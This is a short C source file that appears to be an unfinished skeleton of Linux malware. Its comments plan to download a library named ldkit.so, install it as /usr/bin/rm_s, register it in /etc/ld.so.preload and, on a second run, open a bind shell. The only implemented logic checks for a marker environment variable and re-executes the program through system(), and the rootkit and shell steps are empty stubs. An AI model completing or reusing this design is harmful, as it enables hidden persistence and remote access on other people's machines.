#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define HOST "TEST"

#if !defined(HOST)
#error "You must define the host where it is hosted"
#endif // HOST


int main(int argc, char **argv, char **envp) {
    int is_set = 0;
    for (int i=0; envp[i]!=NULL; i++) {
        if (strstr(envp[i], "SEPA") != NULL) {
            is_set = 1;
            break;
        }
    }

    if (is_set == 0) {
        // downlaod ldkit.so

        // move to /usr/bin/rm_s

        // set /etc/ld.so.preload

        // start another process of this
        char cmd[256];
        sprintf(cmd, "SEPA=2222 %s", argv[0]);
        system(cmd);
    } else {
        // start bind shell

        
    }

    return 0;
}